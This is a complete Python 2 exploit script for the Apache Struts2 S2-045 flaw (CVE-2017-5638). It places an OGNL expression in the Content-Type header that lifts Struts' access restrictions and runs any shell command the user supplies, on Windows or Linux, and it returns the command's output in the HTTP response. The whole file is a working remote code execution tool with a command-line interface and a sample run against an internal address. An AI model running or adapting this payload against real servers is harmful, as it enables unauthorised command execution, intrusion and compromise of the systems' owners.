#!/usr/bin/python
#-*- coding: utf-8 -*-
# CVE-2017-5638
# Apache Struts2 S2-045
# Ex:
# $ ./exploit.py --url http://192.168.11.6:8080/struts2-rest-showcase/ --cmd "whoami"
#
# tomcat7
#
# $

import urllib2
import sys


def exploit(url, cmd):
	response = {}

	payload = "%{(#_='multipart/form-data')."
	payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
	payload += "(#_memberAccess?"
	payload += "(#_memberAccess=#dm):"
	payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
	payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
	payload += "(#ognlUtil.getExcludedPackageNames().clear())."
	payload += "(#ognlUtil.getExcludedClasses().clear())."
	payload += "(#context.setMemberAccess(#dm))))."
	payload += "(#cmd='%s')." % cmd
	payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
	payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
	payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
	payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
	payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
	payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
	payload += "(#ros.flush())}"

	headers = {
		'Content-Type': payload
	}

	try:
		request = urllib2.Request(url, headers=headers)
		res = urllib2.urlopen(request)
		# print res.read()
		response['body'] = res.read()
	except Exception as e:
		print e
		sys.exit()

	print response['body']


if __name__=='__main__':
	import argparse

	parser = argparse.ArgumentParser()
	parser.add_argument('-u','--url', dest='url', required=True)
	parser.add_argument('-c','--cmd', dest='command', default='whoami')
	args = parser.parse_args()

	print ''

	exploit(args.url, args.command)
